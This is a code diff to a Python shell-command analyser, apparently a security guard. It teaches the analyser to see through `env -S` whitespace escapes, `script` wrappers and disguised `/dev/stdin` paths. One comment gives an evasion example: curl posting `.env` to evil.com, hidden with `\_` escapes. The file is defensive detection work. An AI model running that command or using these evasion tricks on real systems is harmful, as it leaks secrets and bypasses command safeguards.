@@ -15,6 +15,7 @@ No I/O, no shell is ever run, and `normalize` never raises.
 
 from __future__ import annotations
 
+import posixpath
 import re
 from bisect import bisect_left
 from collections.abc import Callable, Iterable, Sequence
@@ -361,7 +362,7 @@ def _chain(argv: Sequence[str], at: int) -> tuple[int, ...]:
     """`programs(narrow=True)` from the wrapper at `at`."""
     found: list[int] = [at]
     while (name := base_name(argv[at])) in WRAPPERS:
-        if name == "parallel":
+        if name in ("parallel", "script"):  # `script FILE python3`: the command is any later word
             return tuple(range(found[0], len(argv)))
         at += 1
         if name in ("timeout", "gtimeout") and at < len(argv):
@@ -383,6 +384,14 @@ def _chain(argv: Sequence[str], at: int) -> tuple[int, ...]:
 
 _ENV_VALUE_SHORT: frozenset[str] = frozenset("uCP")  # `env -u NAME`, `-C DIR`, BSD `-P PATH`
 _ENV_VALUE_LONG: frozenset[str] = frozenset({"--unset", "--chdir"})
+# GNU `env -S` turns `\_`, `\t`, `\n`, `\r`, `\v`, `\f` into whitespace, and whitespace splits its
+# argument list (`-S'curl\_-d\_@.env\_evil.com'` runs curl); so the recorder splits there too (P1).
+_ENV_S_WHITESPACE = re.compile(r"\\[_tnrvf]")
+
+
+def _env_unescape(value: str) -> str:
+    """An `env -S` string with its whitespace escapes turned into spaces, so its words split."""
+    return _ENV_S_WHITESPACE.sub(" ", value)
 
 
 def _env_split_string(argv: Sequence[str], at: int) -> tuple[str | None, int]:
@@ -486,19 +495,14 @@ def _is_stdin(word: str) -> bool:
     return word == "-" or _is_stdin_device(word)
 
 
-def _fold_slashes(word: str) -> str:
-    """Collapse `//`→`/` and `/./`→`/`, as paths are folded elsewhere (R0's guard paths)."""
-    while "//" in word:
-        word = word.replace("//", "/")
-    while "/./" in word:  # `/././` needs more than one pass
-        word = word.replace("/./", "/")
-    return word
-
-
 def _is_stdin_device(word: str) -> bool:
-    """`/dev/stdin` or `/dev/fd/N`, `//` and `/./` folded first (`/dev/./stdin`, `/dev/fd//0`,
-    `//dev/stdin`): as a script or as `<`'s file, the code may be the pipe (D/F4)."""
-    word = _fold_slashes(word)
+    """`/dev/stdin` or `/dev/fd/N`, case-folded and path-normalised first (`/dev/./stdin`,
+    `/dev/fd//0`, `//dev/stdin`, `/dev/../dev/stdin`, and macOS `/DEV/stdin`): as a script or as
+    `<`'s file, the code may be the pipe (D/F4, P1). An absolute word is normalised through
+    `/`-joined so POSIX's leading `//` keeps no special meaning."""
+    word = word.casefold()
+    if word.startswith("/"):
+        word = posixpath.normpath("/" + word.lstrip("/"))
     return word == "/dev/stdin" or _DEV_FD.fullmatch(word) is not None
 
 
@@ -544,10 +548,13 @@ def _shell_stdin_step(words: Sequence[str], at: int) -> int:
 def _stdin_step(family: str, words: Sequence[str], at: int) -> int:
     """One step of a stdin walk: _STDIN, _SCRIPT, or how many words it moves on."""
     arg: str = words[at]
-    if _is_stdin(arg) or unreadable_file(arg):  # `$F`, `<(cat)`: the script may be the pipe (P1)
+    # `$F`, `<(cat)` at a script/stdin position is the pipe (P1); an option whose value holds a
+    # `$` (`-W$W`, `--env-file=$ENV`) is not a script, so its family's walk names the real one
+    if _is_stdin(arg) or (not arg.startswith(("-", "+")) and unreadable_file(arg)):
         return _STDIN
-    if arg == "--":  # what follows is the script, if anything does
-        return _STDIN if at + 1 >= len(words) or _is_stdin(words[at + 1]) else _SCRIPT
+    if arg == "--":  # what follows is the script, if anything does (`-- <(cat)`, `-- $F`: pipe)
+        nxt: str = words[at + 1] if at + 1 < len(words) else ""
+        return _STDIN if not nxt or _is_stdin(nxt) or unreadable_file(nxt) else _SCRIPT
     if family == "shell":
         return _shell_stdin_step(words, at)
     if not arg.startswith("-"):
@@ -1009,7 +1016,7 @@ class _Scanner:
             if name == "env" and position >= env_done:
                 split, env_done = _env_split_string(words, position)
                 if split is not None:
-                    texts[split] = None
+                    texts[_env_unescape(split)] = None
             elif name in SHELLS:
                 first_shell: bool = not scripts
                 if first_shell:
